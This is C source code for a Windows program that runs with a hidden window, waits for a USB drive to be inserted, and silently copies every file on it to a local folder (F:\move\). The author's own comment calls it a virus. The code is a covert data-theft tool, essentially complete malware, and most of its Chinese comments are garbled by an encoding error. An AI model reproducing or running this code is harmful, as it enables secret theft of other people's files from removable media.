#include <windows.h>
#include <Shlwapi.h>
#include "fstream"
#include <TlHelp32.h>
#include <Dbt.h>
#include "tchar.h"
#pragma comment(lib,"shlwapi.lib")
#define MAX_THREADS 10//�߳���
#define TIMER 1//��ʱ��
int i = 0;
//function 
TCHAR szExePath[MAX_PATH];//the virus's path
TCHAR U[2];//����U�̵��̷�
TCHAR szSysPath[MAX_PATH];//system path
BOOL SearchFile(TCHAR* szPath);//�����ļ������е��ļ�
//global variable
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);//���ڹ���
//��ȡ�̷�
TCHAR FirstDriveFromMask(ULONG unitmask);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	PSTR szCmdLine, int iCmdShow)
{
	static TCHAR szAppName[] = TEXT("UUUUUU");
	HWND               hwnd;
	MSG                msg;
	WNDCLASS           wndclass;

	wndclass.style = 0;
	wndclass.lpfnWndProc = WndProc;
	wndclass.cbClsExtra = 0;
	wndclass.cbWndExtra = 0;
	wndclass.hInstance = hInstance;
	wndclass.hIcon = 0;
	wndclass.hCursor = 0;
	wndclass.hbrBackground = 0;
	wndclass.lpszMenuName = NULL;
	wndclass.lpszClassName = szAppName;
	if (!RegisterClass(&wndclass))
	{
		MessageBox(NULL, TEXT("Program requires Windows NT!"),
			szAppName, MB_ICONERROR);
		return 0;
	}
	hwnd = CreateWindow(szAppName, NULL,
		WS_DISABLED,
		0, 0,
		0, 0,
		NULL, NULL, hInstance, NULL);
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return msg.wParam;
}
LRESULT OnDeviceChange(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	switch (wParam)
	{
	case DBT_DEVICEARRIVAL: //����
		if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
		{
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
			U[0] = FirstDriveFromMask(lpdbv->dbcv_unitmask);//�õ�u���̷�
			//	MessageBox(0, U, _T("Notice!"), MB_OK);
			SearchFile(U);//����U���ļ�
		}
		break;
	case DBT_DEVICEREMOVECOMPLETE: //�豸ɾ��
		break;
	}
	return LRESULT();
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM
	lParam)
{
	switch (message)
	{
	case WM_CREATE:           //����һЩҪ����Ҫ�õ���ȫ�ֱ���
		U[1] = ':';

		SetTimer(hwnd, TIMER, 5000, 0);//������ʱ��

		return 0;
	case WM_TIMER:             //timer message 

		SendMessage(hwnd, WM_DEVICECHANGE, 0, 0);//�����û�в����豸��Ϣ

		return 0;
	case WM_DEVICECHANGE:
		OnDeviceChange(hwnd, wParam, lParam);
		return 0;
	case WM_DESTROY:
		KillTimer(hwnd, TIMER);
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hwnd, message, wParam, lParam);
}

TCHAR FirstDriveFromMask(ULONG unitmask)
{
	char i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)//������������״̬�Ƿ����˱仯
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}
BOOL SearchFile(TCHAR* szPath)
{
	WIN32_FIND_DATA windata = { 0 };            //�ļ���Ϣ�ṹ
	HANDLE hFile = NULL;
	TCHAR szPathNext[MAX_PATH];					//�����һ��Ŀ¼·��
	TCHAR UFPaht[500], TagPath[200];			//U���ļ�·�� ������ŵ�Ŀ¼ 
	ZeroMemory(szPathNext, sizeof(szPathNext));
	_stprintf(szPathNext, _T("%s//*.*"), szPath);     //�ݹ��ʱ�����������һ��Ŀ¼�����ļ� 
	hFile = FindFirstFile(szPathNext, &windata);//���ҵ�һ���ļ����У�
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	do
	{
		if (windata.cFileName[0] == '.')         //����ǵ�ǰĿ¼�����ϼ�Ŀ¼���������һ��ѭ��
			continue;
		if (windata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) //�ж��Ƿ����ļ���
		{
			_stprintf(szPathNext, _T("%s\\%s"), szPath, windata.cFileName);
			SearchFile(szPathNext); //�ݹ����
		}
		else
		{
			printf("%s//%s\n", szPath, windata.cFileName);//������ļ�������ļ�·��wcscat(szPath,windata.cFileName)
			//MessageBox(0, windata.cFileName,, MB_OK);
			wcscpy(TagPath, _T("F:\\move\\"));
			wcscpy(UFPaht, szPath);
			wcscat(UFPaht, _T("\\"));//���ļ���·����� 
			wcscat(UFPaht, windata.cFileName);//��u���ļ�·����ȫ
			wcscat(TagPath, windata.cFileName);//Ŀ���ļ�·����ȫ
			/*
			�����߳�
			�����ļ�
			д�������Ϣ
			(����չ)
			*/
			CopyFile(UFPaht,TagPath,false);//�����ļ� 

		}

	} while (FindNextFile(hFile, &windata));     //������뵽���һ��û���ļ������Դ��˳�����һ��Ŀ¼
	FindClose(hFile);
	return TRUE;
}
